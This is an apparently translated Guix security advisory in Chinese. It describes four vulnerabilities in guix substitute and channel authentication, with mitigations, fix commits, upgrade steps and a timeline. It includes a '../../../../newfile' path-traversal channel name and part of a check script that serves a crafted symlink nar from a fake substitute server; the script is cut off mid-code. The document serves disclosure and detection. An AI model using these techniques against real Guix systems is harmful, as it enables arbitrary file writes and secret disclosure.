+<li><p>（CVE 编号待定）获取可用替代文件元数据（称为<code>narinfo</code>）的程序（位于 <code>(guix substitutes)</code> 中）及其在 <code>(guix scripts substitute)</code> 中的调用者均未验证其获取的<code>narinfo</code>是否为请求的<code>narinfo</code>。因此，替代服务器（或任何能够冒充替代服务器的人）有可能诱骗<code>guix substitute</code>使用任何已授权替代的store item来替代任何其他已授权替代的store item。这造成的危害程度部分取决于已授权替代服务器已签名或可被说服签名的store item，但至少这可以导致使用过时且不安全的软件版本。</p>
+</li>
+<li><p>（CVE 编号待定）<code>(guix scripts substitute)</code>中的<code>guix substitute</code>实现允许使用<code>file://</code> URI来指定替换服务器URI（<code>narinfo</code>文件所在位置）以及在<code>narinfo</code>文件中指定相应归档文件的下载位置。它不区分通过<code>guix-daemon</code>命令行传递的<code>--substitute-urls</code>和通过guix命令行（用户端侧）传递的<code>--substitute-urls</code>，后者优先于前者。打开这些<code>file://</code> URI会遵循符号链接。因此，不受信任的客户端可能会导致守护进程读取任何文件。如果其中某一行看起来不像有效的<code>narinfo</code>行（它使用<code>recutils</code>格式），<code>guix substitute</code>可能会抛出异常，并将包含该行的回溯信息传递给客户端。例如，如果守护进程用户可以读取一个仅包含一行秘密密码短语的文件，那么该文件的内容可能会被任何本地用户获取。<br>此外，当使用<code>file://</code> URI作为nar下载文件的URI时，如果它恰好是Guix和Nix使用的有效的nar（“规范化归档”）文件，则该文件可能会被写入存储区。不过，这种情况发生的可能性很小。<br>除了可能导致秘密信息泄露之外，这种方法还可以通过<code>/proc/PID/fd</code>中的文件干扰任何守护进程用户可追踪的进程正在读取的文件。</p>
+</li>
+<li><p>（CVE 待分配）<code>guix pull</code>和<code>guix time-machine</code>用于验证通道的<code>(guix channels)</code>中的<code>authenticate-channel</code>函数，会将一个从通道名称派生的缓存键传递给<code>(guix git-authenticate)</code>中的<code>authenticate-repository</code>函数。该缓存键用于确定存储先前已验证提交ID的文件名。如果通道名称的格式为“..&#x2F;..&#x2F;..&#x2F;..&#x2F;newfile”，则可能导致在用户主目录中创建名为“newfile”的文件。如果“newfile”已存在，则该函数也可能覆盖它，但前提是该文件已经是一个类似Scheme语法的字符串列表，因为必须先读取并处理其内容，才能写入新内容。<br>如果执行写入操作，输出将仅包含Scheme语法的注释、换行符以及对应于Git提交标识符的十六进制字符串列表。这使得该漏洞难以用于除拒绝服务攻击之外的实际攻击，但需要注意的是，由于它可以攻击<code>/proc</code>目录下的文件，因此足够有创造力且了解内情的攻击者或许能够进一步利用此漏洞。<br>实际上，只有在使用新添加的机制获取远程通道文件时，才能利用此漏洞。</p>
+</li>
+</ol>
+<h4 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h4><p>可以通过不使用替代文件来缓解漏洞(1)和(2)的远程攻击，方法是向·guix-daemon·传递<code>--no-substitutes</code>参数，或者向所有<code>guix</code>命令传递<code>--no-substitutes</code>参数。但是，始终可以为单个客户端重新启用替代文件，因此这种方法无法防御本地攻击者利用漏洞(1)、(2)或(3)的攻击，这些漏洞无法缓解，必须通过更新来修复。可以通过不使用不受信任的通道文件运行<code>guix pull</code>或<code>guix time-machine</code>来缓解漏洞(4)。</p>
+<p>本文末尾提供了一个用于检测这些漏洞的测试。您可以使用以下命令运行此代码：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guix repl -- guix-substitute-and-pull-vuln-check.scm</span><br></pre></td></tr></table></figure></div>
+
+<p>这将输出4行内容，分别以<code>restore-file</code>、<code>fetch-narinfos</code>、<code>file-uris</code>和<code>cache-key</code>开头，每行后跟一个冒号、一个空格，以及“vulnerable”（易受攻击）或“not vulnerable”（不易受攻击）的文本，具体取决于正在运行的<code>guix-daemon</code>是否存在指定的漏洞。如果所有4行都显示“not vulnerable”，则<code>guix repl</code>将以状态码<strong>0</strong>退出；否则，将以状态码<strong>1</strong>退出。</p>
+<p>某些测试在某些情况下可能无法产生结果。此时，测试名称后的输出将以“error:”开头。无法产生结果的测试应被视为结果不确定。</p>
+<p>如果未授权任何替代程序，或者无法通过任何已配置的替代URL访问当前<code>guix</code>的<code>cfunge</code>、<code>hello</code>或<code>sed</code>包的授权替代程序，则<code>restore-file</code>和<code>fetch-narinfos</code>测试可能无法产生结果。如果<code>cfunge</code>可从某些垃圾回收根目录（例如<code>profile</code>）访问，则<code>restore-file</code>测试可能无法产生结果。如果无法通过网络访问Codeberg来获取<code>guix-science</code>频道的部分历史记录，则<code>cache-key</code>测试可能无法产生结果。可以通过编辑脚本中<code>guix-science-url</code>的定义来解决此问题，将其设置为可以找到<code>guix-science</code>存储库副本的任何URL（或文件名）。</p>
+<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>这些安全问题已通过一系列11个提交修复，从<a class="link"   target="_blank" rel="noopener" href="https://codeberg.org/guix/guix/commit/ed0a9721f8a20d6ddcf6a0495302f502b3f7bb17" >ed0a97<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>开始，到<a class="link"   target="_blank" rel="noopener" href="https://codeberg.org/guix/guix/commit/2ef8ed9f0df53bddf14bdecc2ea48c2d233213cc" >2ef8ed<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>结束，作为<a class="link"   target="_blank" rel="noopener" href="https://codeberg.org/guix/guix/pulls/9665" >PR #9665<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>的一部分。用户应确保已升级到提交<a class="link"   target="_blank" rel="noopener" href="https://codeberg.org/guix/guix/commit/897832f374dcdc9eeaf19d01e70b9a92fccfc68c" >897832<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>或任何后续提交，以避免这些漏洞。升级说明请参见以下部分。</p>
+<p>修复漏洞(1)涉及强化<code>restore-file</code>，使其能够检测并拒绝无效的目录条目名称。具体而言，条目名称必须唯一、严格升序、不为空、不等于“.”或“..”，且不包含“&#x2F;”或空字节。此外，目前用作<code>restore-file</code>函数的<code>#:dump-file</code>参数的程序已被修改，强制要求重新创建目标文件，并且绝不使用符号链接。</p>
+<p>这项修改的灵感来源于对<code>nix/libutil/archive.cc</code>文件中<code>parse</code>函数的<code>nar-parsing</code>实现的分析。分析发现，该实现本身并不存在漏洞，但其安全性几乎达到了漏洞的临界点，仅因所使用的文件系统原语全部拒绝使用符号链接或接受已存在的目标而勉强得以避免（详情请参见此提交信息）。为了避免下次有人仔细检查时再浪费3个小时来发现这个问题，该实现也被重写，使其更加严格且安全性更高。或许并不令人意外的是，当Nix修改该代码以使用<code>std::filesystem</code>中更为宽松的文件系统原语时，最终导致了<strong>CVE-2024-45593</strong>的出现。</p>
+<p>修复漏洞(2)涉及修改<code>fetch-narinfos</code>，使其在结果与请求不匹配时不包含该结果。</p>
+<p>修复漏洞(3)涉及修改<code>(guix scripts substitute)</code>以验证所有来自不受信任来源的替换URL是否都不是<code>file://</code> URL，以及<code>narinfos</code>中的所有nar URL是否都不是<code>file://</code> URL（除非设置了特殊标志，而这仅在测试套件中执行）。</p>
+<p>此外，我们还进行了一些额外的加固措施，将替换项恢复到临时目录中，只有在哈希值验证通过后才会将其移动到最终的存储项路径。虽然这仍然会在验证哈希值之前恢复它们，因此无法阻止漏洞(1)的发生，但它确实确保了攻击者控制的内容不会出现在曾经有效的存储项路径中（如果某些用户或程序没有注意到最近的垃圾回收，则可能仍然认为这些路径有效）。我们还修改了<code>narinfo</code>读取代码，使其拒绝任何<code>StorePath</code>、<code>References</code>或<code>Deriver</code>字段包含不符合存储项路径语法要求的路径的<code>narinfo</code>文件。这样做的一个好处是，我们现在有了验证存储项路径语法的程序。</p>
+<p>修复漏洞(4)涉及更改<code>authenticate-repository</code>用户默认计算<code>cache-key</code>的方式。缓存键不再源自频道名称或（对于<code>guix git authenticate</code>）仓库URL，而是源自初始提交的ID，这是一个非常安全的十六进制字符串。这避免了一些奇怪且潜在危险的行为，例如两个名称相同但其他方面完全不同的频道之间可能会共享已验证的缓存提交ID。此外，<code>authenticate-repository</code>还进行了额外的安全加固，将缓存键中所有出现的点号 (.) 都替换为连字符 (-)，这样即使提供了非默认的缓存键，也无法逃逸缓存目录。</p>
+<h4 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h4><p>鉴于此安全公告的严重性，我们强烈建议所有用户立即升级<code>guix</code>和<code>guix-daemon</code>。</p>
+<blockquote>
+<p>注意：细心的读者可能已经注意到一个两难困境：获取更新的最快方法是通过替代服务器，而缓解最严重的远程可利用漏洞的方法是禁用替代服务器。因此，是否使用<code>--no-substitutes</code>参数需要根据具体情况判断，并考虑以下因素：这些漏洞公开的时间、您的系统与替代服务器之间的网络路径的暴露程度、相关系统自行构建<code>guix</code>的可行性（这部分取决于您上次升级的时间）、相关系统是否有多个用户，当然还有您的威胁模型。</p>
+</blockquote>
+<p>对于Guix系统，操作步骤是在执行<code>guix pull</code>命令后重新配置系统，方法是重启<code>guix-daemon</code>或重启系统。例如：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">guix pull</span><br><span class="line"><span class="built_in">sudo</span> guix system reconfigure /run/current-system/configuration.scm</span><br><span class="line"><span class="built_in">sudo</span> herd restart guix-daemon</span><br></pre></td></tr></table></figure></div>
+
+<p>其中 <code>/run/current-system/configuration.scm</code> 是当前系统配置，当然也可以替换为用户选择的其他系统配置文件。</p>
+<p>对于其他发行版上的Guix，需要使用<code>sudo</code>执行<code>guix pull</code>命令，因为<code>guix-daemon</code>以root用户身份运行，然后按照文档说明重启<code>guix-daemon</code>服务。例如，在采用<code>systemd</code>管理服务的系统上，运行以下命令：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> --login guix pull</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart guix-daemon.service</span><br></pre></td></tr></table></figure></div>
+
+<p>请注意，如果您使用的是发行版自带的Guix软件包（而非通过安装脚本安装），则可能需要采取其他步骤或根据发行版上其他软件包的安装方式升级Guix软件包。有关更多信息或疑问，请参阅发行版的相关文档或联系软件包维护者。</p>
+<h4 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h4><ul>
+<li>2026年5月28日，Nix的Jörg Thalheim将恢复文件漏洞分享给了Christopher Baines和Andreas Enge；Christopher将详细信息发送给了安全响应团队。</li>
+<li>2026年6月4日，Andreas Enge通知了Caleb Ristvedt和Ludovic Courtès，他们开始着手修复。</li>
+<li>2026年6月10日，Caleb Ristvedt发现了<code>guix substitute</code>的<code>file://</code>漏洞。</li>
+<li>2026年6月22日，Caleb Ristvedt发现了第三个漏洞：<code>guix substitute</code>没有验证它获取的<code>narinfo</code>是否是它请求的。</li>
+<li>2026年6月24日，根据Sergio Pastor-Pérez报告的问题，Ludovic Courtès发现了<code>pull</code>和<code>time-machine</code>漏洞，并着手修复。为了方便起见，并且由于线索是公开的，因此决定立即修复该漏洞，并与其他漏洞同时公布。</li>
+</ul>
+<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>我们衷心感谢Jörg Thalheim分享恢复文件漏洞，感谢Christopher Baines验证该漏洞并通知安全响应团队，感谢Andreas Enge确保Ludovic和Caleb能够获知该漏洞，并协助与Jörg保持沟通。</p>
+<p>我们还要感谢安全响应团队的John Kehayias的协调工作以及申请CVE编号。</p>
+<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><p>以下代码用于检查您的<code>guix-daemon</code>是否存在前三个漏洞以及您的<code>guix</code>是否存在第四个漏洞。将此文件另存为<code>guix-substitute-and-pull-vuln-check.scm</code>，并按照上述“缓解”部分的说明运行。</p>
+<div class="code-container" data-rel="Lisp"><figure class="iseeu highlight lisp"><figcaption><span>guix-substitute-and-pull-vuln-check.scm</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">use-modules</span> (<span class="name">git</span>)</span><br><span class="line">             (<span class="name">guix</span> build utils)</span><br><span class="line">             (<span class="name">guix</span> derivations)</span><br><span class="line">             (<span class="name">guix</span> channels)</span><br><span class="line">             (<span class="name">guix</span> config)</span><br><span class="line">             (<span class="name">guix</span> gexp)</span><br><span class="line">             (<span class="name">guix</span> git)</span><br><span class="line">             (<span class="name">guix</span> narinfo)</span><br><span class="line">             (<span class="name">guix</span> packages)</span><br><span class="line">             (<span class="name">guix</span> pki)</span><br><span class="line">             (<span class="name">guix</span> utils)</span><br><span class="line">             (<span class="name">guix</span> serialization)</span><br><span class="line">             (<span class="name">guix</span> store)</span><br><span class="line">             (<span class="name">guix</span> substitutes)</span><br><span class="line">             ((<span class="name">gnu</span> packages base) #<span class="symbol">:hide</span> (<span class="name">which</span>))</span><br><span class="line">             (<span class="name">gnu</span> packages esolangs)</span><br><span class="line">             (<span class="name">srfi</span> srfi-1)</span><br><span class="line">             (<span class="name">srfi</span> srfi-26)</span><br><span class="line">             (<span class="name">srfi</span> srfi-31)</span><br><span class="line">             (<span class="name">srfi</span> srfi-34)</span><br><span class="line">             (<span class="name">rnrs</span> bytevectors)</span><br><span class="line">             (<span class="name">ice-9</span> atomic)</span><br><span class="line">             (<span class="name">ice-9</span> binary-ports)</span><br><span class="line">             (<span class="name">ice-9</span> control)</span><br><span class="line">             (<span class="name">ice-9</span> match)</span><br><span class="line">             (<span class="name">ice-9</span> popen)</span><br><span class="line">             (<span class="name">ice-9</span> rdelim)</span><br><span class="line">             (<span class="name">ice-9</span> textual-ports)</span><br><span class="line">             (<span class="name">ice-9</span> threads)</span><br><span class="line">             (<span class="name">web</span> response)</span><br><span class="line">             (<span class="name">web</span> request)</span><br><span class="line">             (<span class="name">web</span> uri)</span><br><span class="line">             (<span class="name">web</span> server)</span><br><span class="line">             (<span class="name">web</span> server http))</span><br><span class="line"></span><br><span class="line"><span class="comment">;; 1. restore-file</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;; Craft an invalid nar, identify a substitutable path that doesn&#x27;t exist (gc</span></span><br><span class="line"><span class="comment">;; if necessary), get its signed narinfo, start an http server, connect to</span></span><br><span class="line"><span class="comment">;; store, set substitute urls, ask to substitute the chosen path.  Have http</span></span><br><span class="line"><span class="comment">;; server serve the signed narinfo with the URLs replaced with its own.  When</span></span><br><span class="line"><span class="comment">;; the nar is requested, serve the invalid nar.  Once the substitution errors</span></span><br><span class="line"><span class="comment">;; out (hash doesn&#x27;t match), check whether the chosen file now exists with the</span></span><br><span class="line"><span class="comment">;; specified contents.  We&#x27;re vulnerable if and only if it does.</span></span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> target-file</span><br><span class="line">  <span class="string">&quot;/tmp/guix-restore-file-vulnerable&quot;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> target-substitutable-package</span><br><span class="line">  <span class="comment">;; pick something obscure but in the main guix channel, so it is either not</span></span><br><span class="line">  <span class="comment">;; currently valid or can probably be gc&#x27;ed.  This is just to make the test</span></span><br><span class="line">  <span class="comment">;; more reliable - in real exploitation, an attacker can sit around and wait</span></span><br><span class="line">  <span class="comment">;; for any substitute request to be made, but here we need to provoke one in</span></span><br><span class="line">  <span class="comment">;; a timely manner.</span></span><br><span class="line">  cfunge)</span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> substitute-servers</span><br><span class="line">  (<span class="name">with-store</span> store</span><br><span class="line">    (<span class="name">substitute-urls</span> store)))</span><br><span class="line"></span><br><span class="line"><span class="comment">;; Grafts can cause package-&gt;derivation to actually start substituting outputs</span></span><br><span class="line"><span class="comment">;; of the derivation being computed, which means we&#x27;d have to gc it afterward.</span></span><br><span class="line">(%graft? #f)</span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">package-&gt;path+narinfo</span> store package)</span><br><span class="line">  (<span class="name">define</span> path</span><br><span class="line">    (<span class="name">derivation-&gt;output-path</span> (<span class="name">run-with-store</span> store (<span class="name">lower-object</span> package))))</span><br><span class="line"></span><br><span class="line">  (<span class="name">match</span> (<span class="name">lookup-narinfos/diverse</span> substitute-servers (<span class="name">list</span> path)</span><br><span class="line">                                  valid-narinfo?)</span><br><span class="line">    ((<span class="name">info</span>) (<span class="name">values</span> path info))</span><br><span class="line">    (() (<span class="name">values</span> #f #f))))</span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">restore-file-vuln</span>?)</span><br><span class="line">  (<span class="name">define-values</span> (<span class="name">target-path</span> target-info)</span><br><span class="line">    (<span class="name">call-with-values</span> (<span class="name">lambda</span> ()</span><br><span class="line">                        (<span class="name">with-store</span> store</span><br><span class="line">                          </span><br><span class="line">                          (<span class="name">package-&gt;path+narinfo</span> store</span><br><span class="line">                                                 target-substitutable-package)))</span><br><span class="line">      (<span class="name">lambda</span> (<span class="name">path</span> info)</span><br><span class="line">        (<span class="name">unless</span> info</span><br><span class="line">          (<span class="name">error</span> <span class="string">&quot;can&#x27;t find substitutable path to test &#x27;restore-file&#x27; with\n&quot;</span>))</span><br><span class="line">        (<span class="name">with-store</span> store</span><br><span class="line">          (<span class="name">when</span> (<span class="name">valid-path</span>? store path)</span><br><span class="line">            (<span class="name">when</span> (<span class="name">null</span>? (<span class="name">delete-paths</span> store (<span class="name">list</span> path)))</span><br><span class="line">              (<span class="name">error</span> <span class="string">&quot;can&#x27;t delete substitutable path to test &#x27;restore-file&#x27; with\n&quot;</span>))))</span><br><span class="line">        (<span class="name">values</span> path info))))</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> new-target-info-contents</span><br><span class="line">    (<span class="name">let*</span> ((<span class="name">contents</span> (<span class="name">narinfo-contents</span> target-info))</span><br><span class="line">           (<span class="name">signature-index</span> (<span class="name">string-contains</span> contents <span class="string">&quot;Signature:&quot;</span>))</span><br><span class="line">           (<span class="name">after-signature-index</span> (<span class="name">string-index</span> contents #\newline</span><br><span class="line">                                                signature-index))</span><br><span class="line">           (<span class="name">signed-contents</span> (<span class="name">string-take</span> contents (<span class="name">or</span> after-signature-index</span><br><span class="line">                                                      (<span class="name">string-length</span></span><br><span class="line">                                                       contents)))))</span><br><span class="line">      (<span class="name">string-append</span> signed-contents <span class="string">&quot;</span></span><br><span class="line"><span class="string">URL: example.nar</span></span><br><span class="line"><span class="string">Compression: none</span></span><br><span class="line"><span class="string">NarSize: 0\n&quot;</span>)))</span><br><span class="line"></span><br><span class="line">  <span class="comment">;; We can&#x27;t delete target-file if it&#x27;s owned by root, so overwrite it with</span></span><br><span class="line">  <span class="comment">;; fresh, mostly-random contents each time, and check that the contents match.</span></span><br><span class="line">  (<span class="name">define</span> test-contents</span><br><span class="line">    (<span class="name">format</span> #f <span class="string">&quot;VULNERABLE!~%~S:~S~%&quot;</span> (<span class="name">getpid</span>) (<span class="name">random</span> <span class="number">100000000</span>)))</span><br><span class="line"></span><br><span class="line">  (<span class="name">define</span> test-nar</span><br><span class="line">    (<span class="name">call-with-output-bytevector</span></span><br><span class="line">     (<span class="name">lambda</span> (<span class="name">port</span>)</span><br><span class="line">       (<span class="name">for-each</span> (<span class="name">lambda</span> (<span class="name">s</span>)</span><br><span class="line">                   (<span class="name">write-string</span> s port))</span><br><span class="line">                 `(<span class="string">&quot;nix-archive-1&quot;</span></span><br><span class="line">                   <span class="string">&quot;(&quot;</span> <span class="string">&quot;type&quot;</span> <span class="string">&quot;directory&quot;</span></span><br><span class="line">                   <span class="string">&quot;entry&quot;</span> <span class="string">&quot;(&quot;</span> <span class="string">&quot;name&quot;</span> <span class="string">&quot;a&quot;</span></span><br><span class="line">                   <span class="string">&quot;node&quot;</span> <span class="string">&quot;(&quot;</span> <span class="string">&quot;type&quot;</span> <span class="string">&quot;symlink&quot;</span></span><br><span class="line">                   <span class="string">&quot;target&quot;</span> ,target-file <span class="string">&quot;)&quot;</span> <span class="string">&quot;)&quot;</span></span><br><span class="line">                   <span class="string">&quot;entry&quot;</span> <span class="string">&quot;(&quot;</span> <span class="string">&quot;name&quot;</span> <span class="string">&quot;a&quot;</span></span><br><span class="line">                   <span class="string">&quot;node&quot;</span> <span class="string">&quot;(&quot;</span> <span 